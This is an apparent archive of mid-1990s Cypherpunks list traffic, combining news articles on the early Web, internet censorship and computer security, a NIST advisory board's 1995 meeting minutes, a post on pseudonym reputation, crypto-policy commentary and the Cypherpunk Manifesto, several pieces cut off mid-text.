language," said Elisabeth Dufourcq, France's secretary of
state for research at a conference here to announce the
creation of the European branch.
Several large European technology firms, including Oy
Nokia of Finland and Siemens AG of Germany, who are
hoping to play a major role in the development of the
Internet here ponied up $150,000 to join the consortium.
Particularly well-represented are telephone companies who
see the Internet as a threat to their ability to control
national voice and data networks. Among the European
members of the consortium, announced at a conference on
the Web here, are British Telecommunications PLC and the
national telecommunications companies of France, Germany,
Italy and Belgium. All five companies either offer or are
planning to offer Internet access.
One of the group's key tasks is to ensure that
improvements made by such rival companies as Netscape
Communications Corp. and Microsoft Corp., both members of
the U.S. consortium, don't create separate parts of the
Internet that can only be read by Microsoft or Netscape
Membership in the European consortium, which is to be
based at the French national computer-research institute,
Inria, also shows a remarkable degree of interest in the
Web by the French business and government establishment,
which only a year ago dismissed the Internet as a
American version of France's Minitel network, but now is
avidly promoting the Internet's growth.
Among the members of the consortium from France are
Assurances Generale de France, the insurance company;
Electricite de France, the electricty company; Cie. des
Machines Bull, the computer maker; Aerospatiale, the
aerospace concern; and Thomson-CSF, the arms
manufacturer, all of them state-controlled, as well as
such private concerns as Alcatel-Alsthom SA and Groupe

@_subject: whose watchin Cypherpunks: nym question 
Stephen Whitaker-nym's resubmission ("whose watchin the watchers"
4:19 PM 11/5/95) of the very same material that I had  posted last night
suggest some questions about some aspects of nym theory. I hope the
following isn't too naive, and I apologize if it is.
      When I saw issue 183 of GovAccess, Jim Warren-nym's remarks seemed
suspect, but I didn't have a thorough enough understanding of the issues
to judge them myself -- so I decided to vet the question with the
Cypherpunks. I'm glad I did: the quick and knowledgeable responses
clarified the error, and I forwarded them to Warren-nym so that he could
correct himself promptly. The end result, as Warren rightly suggests I
think, is that a better understanding of the issues has been propagated to
his subscriber base.
      AFAIK, Warren-nym has an excellent reputation -- and that fact
certainly encouraged me to provide him with the info he would need to
correct himself quickly. OTOH, my actions garner no reputation for me --
neither for my True Name nor for nobody at REPLAY.COM. Of course, whether
such actions merit any reputational shift is debatable: I contributed no
knowledge of my own, just merely acted as a go-between. Still, the fact
that GovAccess 184 quotes my response might suggest that I beat others to
the punch; and were I able to act in such a capacity on a regular and
consistent basis, and were I to do so in a field with higher stakes, I
would surely garner a reputation. Granted, this is a lot of "woulda,
coulda" -- but it leads me to conclude that it is not the shortcomings of
my *action* that are the cause of the fact that I garner no reputational
improvement in this instance.
      Stephen Whitaker-nym's resubmission of this material, OTOH, lowers
his reputation in my eyes -- which is strange, because the only real
distinction between what he did and what I did has to do with the fact
that he sent mail to Cypherpunks without reading the Cypherpunks traffic.
So his reputational shift is purely contextual.
      So why don't I, then? Well, for starters, the nym that the Replay
remailer assigned to me is publicly accessible: anyone who uses this
remailer in the way that I did will be assigned the same quasi-nym,
nobody at REPLAY.COM. yet if, through some statistical improbability, I were
the *only* person *ever* to use this remailer in this way, and I *only*
ever used it to perform actions that would improve the reputation of a
stable nym, then the public knowledge of Replay's functionality would
neverthless serve to hinder any reputational shift that my actions had
earned: people might say, "Every message I know of that has passed through
Replay has been accurate, timely, and significant" -- but that would
improve the reputation of the Replay remailer rather than of its sole
user, myself, even though it was my actions -- *including* the use of the
Replay remailer -- that brought about this reputational shift.
      So what is a nym if not a "True Name"? I distinguish "True Name" (in
quotes) from True Name: a True Name is tied to a matrix of information
extrinsic to the entity it refers to (a SS# has no *intrinsic* relation to
the entity it designates), whereas a "True Name", though free of this info
matrix, neverthless operates according to the same logic that a True Name
does -- in terms of being tied to actions that garner reputational shifts.
The point being -- I'm probably being pretty unclear -- that if the major
distinction between a "True Name" and a True Name are links (or the lack
thereof) to arbitary and external information (and maybe the disposability
that the lack of links implies), then a lot of nym theory seems like it
pretty much reproduces True Name logic and operations.       Anyway, a lot of you understand this all better than I do, so I hope
to learn from any responses I receive.

     COMPUTER SYSTEM SECURITY AND PRIVACY ADVISORY BOARD
Wednesday, June 7, 1995
A quorum being present, the Chairman, Dr. Willis Ware, called
the meeting to order at 9:00 a.m. at the National Institute of
Standards and Technology (NIST), Gaithersburg, Maryland.
Besides Dr. Ware, the following Board members were present: Charlie Baggett Jr., Genevieve Burns, Cris Castro, Don
Gangemi, Sandra Lambert, Joseph Leo, Henry Philcox, Randy
Sanovic, Linda Vetter, Steve Walker, and Bill Whitehurst.
Mr. Ed Roback, Board Executive Secretary and newly appointed
Designated Federal Official, discussed some of the handouts
provided to the Board.  Most important, was a copy of a draft
House bill referred to as the "Department of Commerce
Dismantling Act."  If enacted, part of NIST would be
transferred to the National Science Foundation.  The Commerce
Program Resolution Agency (CPRA) would be established and
attempt to sell NIST laboratories (and other specified
elements of the Department of Commerce) to the private sector. If not sold within 18 months of enactment, CPRA would submit
their recommendations to Congress on the appropriate
disposition of the property and functions of the laboratories.
OMB Circular A-130, Appendix III Update and Review of Comments
and "NII Security: The Federal Role" Mr. Ed Springer of the Office of Information and Regulatory
Affairs, Office of Management and Budget (OMB), updated the
Board on the recently signed Paperwork Reduction Act of 1995.
(Copies are available for distribution to the Board.)  (ACTION
- SECRETARY).  Mr. Springer said that security remains a
concern and is supported by strong language in the law
requiring agencies to secure their systems. Mr. Springer
updated the Board on Appendix III to OMB Circular A-130. Since his briefing to the Board in March, the comment period
for the proposed changes to Appendix III has closed.  OMB
received twenty-nine written comments to date. He solicited
Board members for their reactions to the draft proposal.  Mr.
Springer was asked how OMB will enforce the requirements of
Appendix III.  He said enforcement comes through oversight and
the budget process. There is a sharper focus on where agencies
can go for help. One Board member asked if OMB plans to
develop a standard set of behaviors.  Mr. Springer replied
that OMB will not go that far; however, Appendix III addresses
the risks for agencies to use as a guideline for security
considerations.  Board members noted that agency visits to
senior management regarding security plans, as was conducted
in the 1989-1990 timeframe, seemed successful.  Mr. Springer
said that the Federal Managers Financial Integrity Act
provides oversight of the requirement for agencies to prepare
new plans.  Mr. Springer agreed to brief the Board at its
September meeting to further discuss the comments received and
current status.  He mentioned that the final document "NII
Security: The Role of Federal Government," would be out soon
and Board members would receive copies.  (ACTION - SECRETARY).
Defensive Information Warfare & Unclassified Government and
Private Sector
Mr. Martin Hill, Deputy Director for Information Warfare
Programs, Office of the Assistant Secretary of Defense,
briefed the Board on Information Warfare (IW) from a DoD
perspective. He said that commanders should not depend on
information and information systems that they cannot rely on. He used the example of Desert Storm, which was a won through
the use of intelligence; Iraq, in effect, lost the war before
it even began.  Mr. Hill said that IW is driven by daily
attacks on U.S. computer networks.  The national security
construct is changing because DoD utilizes commercial sector
security and shares their vulnerabilities.  The DoD
unclassified definition of IW is "Actions taken to achieve
information superiority in support of national military
strategy by affecting adversary information and information
systems while leveraging and protecting our information and
information systems."  Some of the areas that need defending
are: leadership; command facilities; integrated air defense
and controls; computers, software, data bases, and displays;
power production sources; and links to media. The U.S. IW
strategy is to:
-  Use U.S. technological superiority to provide the right
   information to the right place at the right time,
-  Aggressively defend against attacks on our information, and
-  Use offensive techniques to attain and maintain information
   superiority.
Mr. Hill also emphasized the need for and importance of
training.  He said they have assembled "Red Teams" made up of
DoD personnel that converge on other DoD systems to determine
their vulnerabilities.  When asked how DoD could best
communicate their requirements to the commercial sector, Mr.
Hill said that they conduct seminars and "war games" which are
both attended by industry.  (See Reference X/Open Security Branding Proposal
Mr. Peter Callaway, Senior Security Technologist for IBM,
provided the Board with an update on the X/Open security
branding proposal.  Mr. Callaway was speaking from three
perspectives: IBM (a member of X/Open), X/Open, and as a user. He said that X/Open feels they have the appropriate and proven
experience by setting industry standards and performing
conformance branding.  X/Open has the commitment of vendors to
build products to their specifications with regard to
technical plans established with vendor cooperation and
commitment to product follow-through.  X/Open Branding is a
certification scheme for conformance verification, not
evaluation. Currently, X/Open branding requires evidence of
successful execution of a test suite where appropriate test
suites are available.  It requires a conformance statement
questionnaire and a trademark license agreement to be
completed by the applicant.  (See Reference # 2.)
Security Policy Board (SPB) Update
Ms. Vicki LaBarre, Security Policy Board (SPB) Staff, briefed
the Board on the progress of the SPB.  Ms. LaBarre reminded
the Board of the role of the SPB as chartered by Presidential
Decision Directive (PDD)-29.  The SPB and Security Policy
Forum are jointly chaired by DoD and intelligence community
members, but their members include non-DoD and
non-intelligence community representatives. Ms. LaBarre
relayed that the SPB considers itself an "honest broker" to
identify issues and positions from all parties on key
questions.  She said that the fundamental question is whether
the executive branch needs a single, consolidated INFOSEC
policy making mechanism.
If a consolidated INFOSEC policy making mechanism is needed: Can the existing SPB structure created by PDD-29 meet that
-  If yes: how should an information systems security
   committee be chartered and constituted?
-  If not: how could/should the SPB/SPF be modified to become
   an effective INFOSEC policy mechanism?  What other existing
   entity in the executive branch could act, or be modified to
   act as the executive branch's INFOSEC policy making
   apparatus?  What kind of new entity could be created to
   meet this policy making need?
If a consolidated INFOSEC policy making mechanism is not
-  How can the existing INFOSEC policy and advisory boards,
   committees, forums, etc., be made to more effectively
   identify, prioritize, resource and act on major INFOSEC
   issues and vulnerabilities affecting the national interest?
-  Are executive branch INFOSEC resources adequate to provide
   for acceptable security for government information systems?
-  Are existing INFOSEC resources appropriately located and
   distributed within the executive branch?
Recently the SPB staff convened a special working group to
draft a resolution to call for compiling a list of major
INFOSEC issues.  The matter will be discussed at the Security
Policy Board Forum meeting on June 23.  In summary, Ms.
LaBarre emphasized that we must to do a better job of INFOSEC
governmentwide which is doable if everyone works together for
the common good.
Throughout Ms. LaBarre's presentation, some Board members
expressed serious concerns about many aspects of the SPB's
charter, the first SPB staff report and their present stance
on the effort of a single policy making mechanism.  Some Board
members expressed the view that the initial report was not
clear with regard to what kind of information would encompass
"national interest." She said that the first report was purely
a "think piece" to stimulate discussion, which it has done.
(See Reference Commercial Key Escrow Update
Mr. Steve Walker, President, Trusted Information Systems
(TIS), presented the Board with an update of TIS' Commercial
Key Escrow (CKE) activities.  Mr. Walker recently met with
senior management of National Semiconductor Corporation.  They
discussed a proposal to use CKE in an escrowing approach
called Commercial Automated Key Escrow (CAKE) in which the CKE
system has been modified to work with National's PersonaCard
cryptographic hardware tokens. Mr. Walker believes that this
approach meets the needs expressed by the Vice President. CAKE does the following:
1. It removes all very strong cryptography from software.
2. It uses these special CAKE tokens to automatically escrow
   an encrypted copy of every message key within the message
   envelope itself, in a special Data Recovery Field (DRF)
   consisting of the message key and Data Recovery Center
   (DRC) and token identifiers, encrypted with the public key
   of a Designated DRC.
3. It provides access to DRFs via the private key of the DRCs,
   and allow any user to establish their own DRC to safeguard
   corporate information.
4. It uses well known cryptographic algorithms such as DES,
   triple DES and RSA, instead of algorithms such as Skipjack.
5. Finally, it gives American computer and communications
   industries the ability to easily export strong and very
   strong encryption as part of their information highway
   products.
Mr. Walker briefly discussed the software binding issue which
have been put off by implementation into the PCMCIA card but,
it still needs to be tried and a software vendor is being
sought to do so.  The card implementation is aimed at files
and e-mail, not telephony.  There is initial concern with
regard to cost, however, it is tamper proof and cannot be
distributed over the Internet.  Mr. Walker said they are
seeking export approval with DES and CKE and hopes for a
position resolution in the near future. (See Reference The meeting recessed at 5:20 pm.

SI-PMO Action Plan Briefing
Mr. Al Williams, Acting Director of the Security
Infrastructure Program Management Office (SI-PMO) at GSA,
updated the Board on the activities and progress of the
SI-PMO.  He discussed some of the near term goals: identifying
and resolving critical policy issues related to support
multiple technologies, developing a security architecture,
defining user-to-user and user-to SI specifications, and
establishing a formal liaison between the SI-PMO and the
Canadian Government.  Board members asked about milestones. Mr. Williams directed members to the summary of the near-term
actions and milestones in the Action Plan appendix.  When
asked who has received the Action Plan, Mr. Williams replied
that it was distributed to the Government Information
Technology Services Group, the National Information
Infrastructure Security Issues Forum, the Electronic Commerce
Acquisition Program Management Office, the E-Mail Program
Management Office, NSA, NIST, and the PKI Steering Committee.
The Board commended Mr. Williams for working an issue with a
real time frame.  Mr. Williams was invited to come back and
update the Board as he feels appropriate.  (See Reference Common Criteria Update
Dr. Stu Katzke, Chief, NIST Computer Security Division,
updated the Board on the Common Criteria (CC) effort.  He
discussed the Common Criteria for Information Technology
Security Evaluation workshop on May 11-12 in Ottawa, Canada. Approximately 40 people from Europe, Canada, the U.S., and
Japan participated in the workshop.  The workshop served to
allow the CC Editorial Board to:
-  provide general information on the comments received and
   the planned changes to the document based on these
   comments; and
-  receive added clarifications on the reviewers' comments on
   the document so they can update the document to reflect the
   expert opinions.
The number of assurance levels and where they are were
discussed; however, that issue is not as high on the list as
the six key global issues below:
1. Document Organization - understandability and usefulness;
2. Extensibility of Requirements - support of ITSEC is
   unclear;
3. Extensibility of CC - how to maintain the CC;
4. Protection Profile - relationship unclear;
5. Protection Profile - selection of requirements; and
6. Dependencies and Binding - completeness/correctness.
Dr. Katzke said that the NCSC plans to perform evaluation
trials by January of 1996.  (See Reference   Mr. Charlie
Baggett volunteered to brief the Board in September  on trial
evaluations.  (ACTION - SECRETARY AND MR. BAGGETT.)
The discussion then turned to the Board's March resolution
(95-2) which recommended to NIST and NSA that a statement be
made regarding the equivalence of C2-level evaluated products. Mr. Lou Giles of NSA briefed the Board on NIST and NSA's
response to that recommendation.  In July, NIST and NSA will
publicly clarify the relationship between TCSEC C2, ITS EC E2,
and CTCPEC T1 levels to encourage federal programs with
requirements for evaluated low assurance level products to use
trusted products evaluated at these levels.  NIST and NSA will publish a Bulletin in July 1995, which will describe a
structure for the selection and acceptability of these
products.  The Bulletin will include an appendix listing the
products evaluated  and in evaluation under each criteria. (See Reference Mr. Giles used the phrase "selection preferences for C2
requirements."  Some Board members said that the word
preference takes away from equivalency and they are concerned
that the list of requirements is a preference list rather than
a menu.  Selection preferences for C2 requirement are
as follows:
-  C2 products on U.S. EPL;
-  Products under U.S. TCSEC Evaluation (C2);
-  FPC2/T1 products on Canadian EPL or
   FC2/E2 products on European EPL; and
-  Products under CTCPEC (FPC2/T1) or ITSEC (FC2/E2)
   Evaluation.
Some Board members are concerned that the list suggests that

During discussion time, Board members voted on and unanimously
approved the minutes of the March, 1995 meeting.
The Board engaged in a lengthy discussion concerning PDD-29
and the intent of the charter of the SPB.  Board members
debated the idea of a single policy focal point.  They also
debated the phrase in PDD-29 "National Security."  One Board
member reminded the Board of a Government Computer News
article that PDD-29 appears to be clouded as to whether the
PDD intended to include sensitive unclassified information in
addition to national security (i.e., classified/Warner
Amendment) information.  A motion was moved and seconded
directing the chairman to draft a letter to the Co-Chairs of
the SPB and the SPF, articulating the need for clarification

Mr. Robert Rosenthal, Manager, NIST Protocol Security Group,
briefed the Board on the activities of the Public Key
Infrastructure (PKI) Steering Committee.  Three working groups
reside under the Committee: technical (chaired by IRS),
business and legal (chaired by Treasury), and users (chaired
by the SI-PMO).  The Steering Committee continues to liaise
with the Canadian and Swedish governments, the Internet
community, the American Bankers and American Bar Associations
and the U. S. Council for International Business.  The
Steering Committee is exploring the establishment of a
Cooperative Research and Development Agreement (CRDA) with
industry organizations to:
-  Research and Develop a PKI Interoperability Test Plan and
   a NIST PKI Test Facility;
-  Publish test procedures and lessons learned; and
-  Develop and Demonstrate Interoperable Certificate Services

Mr. Rosenthal said there are workshops and special projects
slated for the future to include a tri-sponsored PKI
Invitational Workshop Series by NIST, the Security
Infrastructure Program Management Office and MITRE.  Also
planned, are some interdivision projects such as: PKI, time
and attendance, travel, procurement, and others that will be
available on the "NISTNET." NISTNET is a campus-wide local

major INFOSEC research programs in government and the major
user of INFOSEC is DISA.  The Information Systems Security
Research Joint Technology Office was established by a
Memorandum Of Agreement (MOA) in March of 1995 and signed by
the Directors of ARPA/DISA/NSA to coordinate security research

NY Times, November 8, 1995, Editorial
Cyberspace in Singapore. The Internet Threat to Official
"The Internet is like fire," Mr. Yeo said. "If you don't learn how to control it, it will burn you." In Singapore, a little democracy can be a dangerous thing.
Singapore. From his 37th-floor office overlooking
Singapore Strait, George Yeo can survey the oil
refineries and bustling dockyards that helped make
Singapore the trade and financial center of Southeast
Asia. But the view that interests the Minister of
Information and the Arts these days is not the vista
beyond his window. It is the image on the computer
terminal at his desk. Mr. Yeo, like the rest of
Singapore's top politicians, wants his country to be a
leader in the manufacture and use of computer technology
without relinquishing the Government's chokehold on the
dissemination of information in Singapore.
Singapore's effort to find a balance point will be
closely watched by other Asian countries that mix
capitalist economics with authoritarian politics. The
difficulty was underlined last week. Even as Mr. Yeo
worried about the perils of the Internet, the Government
announced it was relocating 500 industrial enterprises to
make room for the development of advanced electronics
manufacturing plants.
Contradictions like that abound in Singapore, a country
that eludes simple classification. With its gleaming
skyscrapers and shopping arcades, it can seem like Dallas
transplanted to the South China Sea. Conversely, the
dominance of one political party and the presence of a
paternalistic Government can make it feel like a remnant
of the Soviet bloc. Salman Rushdie's "Satanic Verses" and
Cosmopolitan magazine are banned, yet the city's largest
bookstore stocks a selection of contemporary literature
and the works of Chee Soon Juan, Singapore's opposition
Singapore's gaudy prosperity challenges the American
faith that individual liberty is essential for a vital
marketplace. George Yeo is the personification of that
challenge. Born in Singapore in 1954, educated at
Cambridge University and Harvard Business School, he is
disdainful of the cacophony and untidiness of American
democracy. Like Lee Kuan Yew, the architect and ruler of
modern Singapore, he believes the vulnerabilities of his
ethnically divcrse city-state can be best handled by a
strong government that encourages a sense of community
and limits individual rights.
But controlling semiconductors is not the same as
controlling newspapers, television networks or political
opponents. With the aggressive use of libel and slander
statutes Singapore's leaders have intimidated the
newspapers that publish here, including The International
Herald Tribune. To control television broadcasting, the
Government has banned household use of satellite dishes.
Some political pluralism is permitted, but no one doubts
the primacy of Mr. Lee's People's Action Party.
Recognizing the risk of bottling up public demand for
foreign television broadcasts, Singapore's leaders are
wiring the country for cable television. That way viewers
will receive many more channels, including MTV, while the
Government will still be able to screen out programming
it finds objectionable. It is the quintessential
Singapore solution.
Singapore's approach to controlling cyberspace is equally
ingenious, but harder to enforce. Mr. Yeo, essentially,
hopes to control the Internet by embracing it. He is
encouraging use of the Internet by equipping schools with
computers, and establishing systems that allow
Singaporeans to link up with the computer network by
dialing a local phone number.
The catch is that the Government will be able to monitor
use of the Internet that goes through local servers, and
is already intervening to block material it considers
pornographic. The Government has blunted an uncensored
Internet forum on Singapore political life by assembling
a group of users who make sure the Government's views are
Mr. Yeo concedes that more sophisticated and affluent
users can outflank many of his defenses by dialing into
the Internet through foreign phone systems. His purpose,
he says, is to lay down markers for citizens, expecting
that most will abide by them. "The Internet is like
fire," he said. "If you don't learn how to control it, it
will burn you." In Singapore, a little democracy can be
a dangerous thing.

Giving up on what? On doing everything within its power to keep the world
beyond itself strong-cypto-free? Not likely.
In only a few decades, crypto's gone from being unheard of to the object
of an increasingly high-profile PR war over "domestic and international
terrorists and criminals." The govt's position, however, hasn't changed
substantially: it doesn't like crypto, and it never will. There will never
be a time when the cops who pull you over or drop by for a visit will say,
"Ma'am, if you've encrypted that, we respect the fact that you don't want
anyone to see that--so we'll just be going bow. You have a nice day, now,
y'hear." And there will never be no cops.
The gov't may well lose this fight eventually, but a few heads are gonna
get broken before either side wins. This fight is playing itself out on
the level of policy now, but it's much bigger than a policy issue. And the
"revolution" of Newt and his legions of weenies (I say nothing of Clinton
and his legions of weenies) is bullshit: he's an empty opportunist who's
riding a fractious coalition that'll make Clinton look like a libertarian
if it ever gets control of the country. And right now he's cluing in to
the fact that he can score some points on encryption issues: he's got his
eye on the snowballing WiReD coalition, which *no one* knew existed until
a few years ago.

people toward definable ends: Perry is, among other things, a craftsman.
And if I'm not mistaken, he lives in a place where he gets to see how many
people live, and how they live together; this is very different from
*choosing to* live where and how TCM does. (Is this a "scurrilous attack,"

be an oaf, but the *reaction* to him demonstrates just how stupid it is to

      "Replacing" is a participle: what is the agent? If the agent is an
individual, or an alienated mass of individuals, it will not be able to

The Nov 11 WSJ reports on the scare tactics of security
consultants in the U.S. and by their co-conspiring
counterparts -- spies -- abroad:
Richard Heffernan, an information-security specialist for
30 years, said his clients sometimes return to their
hotel rooms to find their belongings ransacked,
especially in Europe. Some European companies will pay as
much as $10,000 for the laptop of a Fortune 500
executive, he adds.
Watch out for tiny surveillance tools. In 1992, the
Canadian government reportedly warned businessmen that
the French intelligence service was bugging airline seats
and using undercover agents as flight attendants.
Penlight cameras placed above airline seats can make
readable photos of laptop screens.
Spies on planes can overhear conversations from several
seats away. Look for them in business suits with plenty
of luggage, says security consultant Kevin Coffey. "These
guys fit in."
Another consultant estimates that 45% of bugs are on fax
machines, and one group of U.S. executives inadverdently
gave their secrets to the competition by using the fax
machine at Moscow's upscale Metropol Hotel, which is
staffed with former FBI and KGB operatives.
If you are carrying extremely sensitive information, be
especially paranoid.
All this may be too much for some companies, who say they
don't have time to evade possible spies. Rather than take
the trouble, some companies end up postponing business
plans aborad, saying, "Forget it. We'll come back in a
few years."
That's what they said at the office, now listen to the bug

Privacy is necessary for an open society in the electronic age.
Privacy is not secrecy.  A private matter is something one doesn't
want the whole world to know, but a secret matter is something one
doesn't want anybody to know. Privacy is the power to selectively
reveal oneself to the world.  If two parties have some sort of dealings, then each has a memory of
their interaction.  Each party can speak about their own memory of
this; how could anyone prevent it?  One could pass laws against it,
but the freedom of speech, even more than privacy, is fundamental to
an open society; we seek not to restrict any speech at all.  If many
parties speak together in the same forum, each can speak to all the
others and aggregate together knowledge about individuals and other
parties.  The power of electronic communications has enabled such
group speech, and it will not go away merely because we might want it
Since we desire privacy, we must ensure that each party to a
transaction have knowledge only of that which is directly necessary
for that transaction.  Since any information can be spoken of, we
must ensure that we reveal as little as possible.  In most cases
personal identity is not salient. When I purchase a magazine at a
store and hand cash to the clerk, there is no need to know who I am. When I ask my electronic mail provider to send and receive messages,
my provider need not know to whom I am speaking or what I am saying
or what others are saying to me;  my provider only need know how to
get the message there and how much I owe them in fees.  When my
identity is revealed by the underlying mechanism of the transaction,
I have no privacy.  I cannot here selectively reveal myself; I must
_always_ reveal myself.
Therefore, privacy in an open society requires anonymous transaction
systems.  Until now, cash has been the primary such system.  An
anonymous transaction system is not a secret transaction system.  An
anonymous system empowers individuals to reveal their identity when
desired and only when desired; this is the essence of privacy.
Privacy in an open society also requires cryptography.  If I say
something, I want it heard only by those for whom I intend it.  If the content of my speech is available to the world, I have no
privacy.  To encrypt is to indicate the desire for privacy, and to
encrypt with weak cryptography is to indicate not too much desire for
privacy.  Furthermore, to reveal one's identity with assurance when
the default is anonymity requires the cryptographic signature.
We cannot expect governments, corporations, or other large, faceless
organizations to grant us privacy out of their beneficence.  It is to
their advantage to speak of us, and  we should expect that they will
speak.  To try to prevent their speech is to fight against the
realities of information. Information does not just want to be free,
it longs to be free.  Information expands to fill the available
storage space.  Information is Rumor's younger, stronger cousin;
Information is fleeter of foot, has more eyes, knows more, and
understands less than Rumor.
We must defend our own privacy if we expect to have any.  We must
come together and create systems which allow anonymous transactions
to take place.  People have been defending their own privacy for
centuries with whispers, darkness, envelopes, closed doors, secret
handshakes, and couriers.  The technologies of the past did not allow
for strong privacy, but electronic technologies do.
We the Cypherpunks are dedicated to building anonymous systems.  We
are defending our privacy with cryptography, with anonymous mail
forwarding systems, with digital signatures, and with electronic
Cypherpunks write code.  We know that someone has to write software
to defend privacy, and since we can't get privacy unless we all do,
we're going to write it. We publish our code so that our fellow
Cypherpunks may practice and play with it. Our code is free for all
to use, worldwide.  We don't much care if you don't approve of the
software we write.  We know that software can't be destroyed and that
a widely dispersed system can't be shut down. Cypherpunks deplore regulations on cryptography, for encryption is
fundamentally a private act.  The act of encryption, in fact, removes
information from the public realm.  Even laws against cryptography
reach only so far as a nation's border and the arm of its violence.
Cryptography will ineluctably spread over the whole globe, and with
it the anonymous transactions systems that it makes possible. For privacy to be widespread it must be part of a social contract.
People must come and together deploy these systems for the common
good.  Privacy only extends so far as the cooperation of one's
fellows in society.  We the Cypherpunks seek your questions and your
concerns and hope we may engage you so that we do not deceive
ourselves.  We will not, however, be moved out of our course because
some may disagree with our goals.
The Cypherpunks are actively engaged in making the networks safer for
privacy.  Let us proceed together apace.

America Online to Warn Users About Bad E-Mail
Vienna, Va. -- It's a case of myth becoming reality in
the digital age.
America Online Inc. plans to warn subscribers of a
damaging piece of electronic mail that could corrupt
their computers' hard drives.
The existence of the destructive file follows a long-term
hoax that has been dogging AOL for months. Last year, a
user began circulating a warning about a "Good Times"
virus that would crash users' PCs if they so much as read
the piece of electronic mail. AOL, the Federal
Communications Commission and the Pentagon repeatedly had
to label the alleged virus a hoax.
But the new file is all too real. The destructive file,
attached to electronic mail, has been circulated through
the on-line service and the Internet. Receiving the
e-mail wouldn't harm a user's computer, but trying to run
the attached file, known as AOL Gold or "install.exe,"
could render a hard drive inoperable, an AOL spokeswoman
The company said it has notified various
computer-security agencies about the program. AOL also
plans to post a letter for its four million users
strongly urging them to forgo "downloading attached files
from people you don't know."
Security experts fear that such Trojan Horses will
proliferate as programs become easier to attach to
electronic mail and the use of networks grows.

If Medium Is the Message, the Message Is the Web
By John Markoff
San Francisco, Nov. 19 -- The Associated Press was formed in
the mid-19th century when a group of newspapers decided to
invest jointly in a newfangled medium -- the telegraph -- to
speed the collection and dissemination of information.
Last week, A.P. announced that it would adopt a newer-fangled
medium -- the World Wide Web -- to begin distributing its
articles and photographs over the global Internet. It was
simply the latest, but perhaps most historically significant,
move yet by an old-line media organization into the World Wide
Web, the Internet multimedia information-retrieval system that
appears on the verge of becoming a mass medium itself.
If the medium is the message, then the message these days is
the World Wide Web.
In short order the Web, which three years ago was little more
than a research tool for physicists and computer hobbyists,
has flourished. It is being embraced by media concerns,
consumer-product companies and businesses of various stripes
that are creating thousands of so-called Web sites each month,
with the number of computers playing host to one or more of
these sites already exceeding 100,000.
Conservative estimates place the number of people who have
used the Web in the millions, and it is not hard to find more
breathless estimates in the tens of millions.
Capable of letting people use computers to send and receive
text, sound, still images and video clips, the Web
incorporates elements of the various print and electronic
media that have preceded it. And yet, the Web is poised not to
replace its predecessors but to take a place alongside them as
a social, cultural and economic force in its own right.
Its complementary role is already evident: many radio stations
and all the major television networks have Web sites promoting
their programs and stars. Newspapers, including The New York
Times, are devising cyberspace editions.
And few movies anymore are released without a promotional Web
site, including "Goldeneye" the James Bond film that opened
this weekend at theaters everywhere and on the Web at the
address  The site offers the movie's
theme song performed by Tina Turner, more than a dozen video
clips from the film and illustrated biographies of the cast
Prime-time television commercials by Toyota and other
advertisers now routinely include a Web address. And Procter
& Gamble, whose advertising has long helped underwrite the
mass media, has even staked out prime Web real estate by
reserving addresses that include flu.com and toiletpaper.com.
"We are poised on the edge of a new medium," Clay Felker,
director of the magazine program at the University of
California at Berkeley's graduate journalism school, said.
"It's going to change the nature of how we acquire
As with each mass medium that has arrived before it, the Web
has reached this threshold through a confluence of a key
technology, a ready audience and a stream of corporate backers
willing to bet that profitable businesses can be built on it.
But few experts are willing to declare that the Web has taken
its place in the mass media pantheon because the profitable
business formulas have yet to be found.
Newspapers and magazines make money by selling individual
copies, subscriptions and advertising space. Radio and
television stations sell air time to those with money and a
message. Movie theaters sell tickets. But on the Web so far,
despite seed-money by adventurous advertisers and some
tentative efforts to charge for access to sites or services,
there is no certainty that this medium will achieve the
critical mass that capitalism demands of its mass media.
"How do you make a business out of the World Wide Web?" asked
Norman Pearlstine, editor in chief of Time Inc., which has an
experimental Web site called Pathfinder that offers selected
contents from the company's magazines
( But because ad revenue alone is
not carrying the freight, Time Inc. will begin testing ways to
charge visitors to its site.
And yet, the technological prerequisites are firmly in place.
The Web is an outgrowth of the Internet, which began as an
academic research experiment in the late 1960's. For more than
two decades the Internet remained largely inaccessible, used
mainly by computer scientists and Pentagon researchers,
university scholars and students.
Then came the World Wide Web.
Like the Internet, the Web began as a tool to let scientists
easily and quickly share information. Conceived in the late
1980's by Tim Berners-Lee, who was then a software designer at
CERN, the Swiss physics research center, the basic Web
technology was first put to use in 1990.
The big breakthrough came in 1992, when student researchers at
the National Center for Supercomputing Applications in
Illinois created Mosaic, a simple software tool called a Web
browser. Mosaic permitted access to information anywhere on
tke World Wide Web by letting the user point and click a
computer mouse on highlighted words or images on the screen.
The browser, which became available in commercial versions
like Netscape Communications' Navigator, not only made Web
sites easily accessible, it prompted businesses, organizations
and even individuals to create new Web sites by the thousands.
Thus did the Web quickly become a standard and accepted way
for the growing millions of the computer-literate to
communicate and to entertain and inform themselves. And unlike
each previous mass medium, the Web does not require its
audience to be merely passive recipients of information.
For very little money, and with a modicum of computer skills,
virtually anyone can create his or her own Web site. Anyone
with a modem is potentially a global pamphleteer.
One consequence of this democratization is that the Web can be
a remarkably anarchic forum compared with the old-style mass
media. "Think of this as television colliding with the
telephone party line," said Paul Saffo, a computer industry
consultant at the Institute for the Future, a Menlo Park,
Calif., research firm. "In terms of social consequences, the
Web is a great experiment. It's going to deliver us community
with a vengeance -- and we may find we don't want it."

Losses From Computer Breaches Are on the Rise, a Study Finds
By Peter H. Lewis
Financial losses from computer break-ins and other security
breaches are on the rise, according to a survey of corporate
computer-security managers, with nearly half of all companies
reporting losses as a result of hackers, viruses, sabotage,
corporate spies and incompetent employees.
At least 20 of the 1,290 companies responding to the annual
security survey from Information Week magazine and the
consulting firm Ernst & Young, reported losses of more than $1
million last year.
But the poll also found that companies were more aware of the
risks arising from growing reliance on computer networks, and
were taking stronger steps to protect their information
"There is definitely increased awareness on the part of senior
management," said Daniel White, national director of
information security at Ernst & Young's Chicago office. But
Mr. White said that despite increased vigilance by computer
security officers, the lack of security tools made it risky to
conduct electronic-document interchange and other sensitive
business operations on the Internet.
"Lots of organizations are using the Internet in a thoughtful
way for marketing and information dissemination," Mr. White
said. "But do I really want to use it" for an
electronic-document transaction? "Not yet."
Details of the survey, the third annual one, are in the Nov.
28 issue of Information Week, available this week.
Among other findings were that nearly 80 percent of companies
surveyed had at least one full-time information-security
officer, a slight increase from last year. Of those, 45
percent report directly to the corporation's chief information
officer, reflecting the growing recognition of the importance
of computer security, Mr. White said.
Nearly 70 percent of those responding said their companies had
sustained a serious virus attack in the last year, a sharp
rise from 54 percent two years ago.

